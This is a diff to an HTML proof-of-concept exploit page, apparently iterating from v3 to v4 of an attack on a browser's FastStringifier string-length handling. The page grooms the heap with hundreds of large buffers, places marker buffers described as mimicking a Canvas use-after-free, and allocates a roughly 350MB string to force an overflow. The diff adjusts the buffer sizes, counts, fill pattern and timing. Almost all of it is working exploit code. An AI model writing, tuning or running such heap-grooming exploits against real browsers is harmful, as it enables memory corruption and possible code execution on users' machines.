@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>FastStringifier Overflow PoC v3</title>
+    <title>FastStringifier Overflow PoC v4</title>
     <style>
         #trigger {
             margin: 20px;
@@ -20,15 +20,15 @@
     </style>
 </head>
 <body>
-    <h1>FastStringifier Overflow PoC v3</h1>
+    <h1>FastStringifier Overflow PoC v4</h1>
     <p>Click to trigger string length overflow with memory checks.</p>
     <button id="trigger">Trigger Overflow</button>
     <script>
         function setupMemoryCheck() {
             const buffers = [];
             // Allocate buffers with 0x46 (mimic Canvas UAF)
-            for (let i = 0; i < 20; i++) {
-                const buf = new ArrayBuffer(8192); // 8KB each
+            for (let i = 0; i < 50; i++) {
+                const buf = new ArrayBuffer(4096); // 4KB each
                 const view = new Uint8Array(buf);
                 view.fill(0x46); // Fill with 0x46
                 buffers.push(view);
@@ -50,10 +50,10 @@
             alert('Initiating PoC...');
             try {
                 // Heap grooming
-                alert('Grooming heap...');
+                alert('Grooming heap with 300x512KB buffers...');
                 const groom = [];
-                for (let i = 0; i < 500; i++) {
-                    const buf = new ArrayBuffer(1024 * 1024); // 1MB
+                for (let i = 0; i < 300; i++) {
+                    const buf = new ArrayBuffer(512 * 1024); // 512KB
                     const view = new Uint8Array(buf);
                     view.fill(0x41);
                     groom.push(view);
@@ -61,14 +61,14 @@
 
                 // Initialize memory checker
                 const check = setupMemoryCheck();
-                alert('Memory checker initialized (20x8KB buffers with 0x46).');
+                alert('Memory checker initialized (50x4KB buffers with 0x46).');
 
                 // Allocate large string
-                const stringSize = 400000000; // ~400MB
+                const stringSize = 350000000; // ~350MB
                 alert(`Attempting to allocate string of size ${stringSize} bytes...`);
                 setTimeout(() => {
                     try {
-                        const string = "\x00".repeat(stringSize);
+                        const string = "A".repeat(stringSize); // Try "A" pattern
                         alert('String allocated successfully.');
 
                         // Check memory before stringify
@@ -85,7 +85,7 @@
                     } catch (err) {
                         alert(`Error: ${err.message}`);
                     }
-                }, 300);
+                }, 400);
             } catch (err) {
                 alert(`Initial error: ${err.message}`);
             }
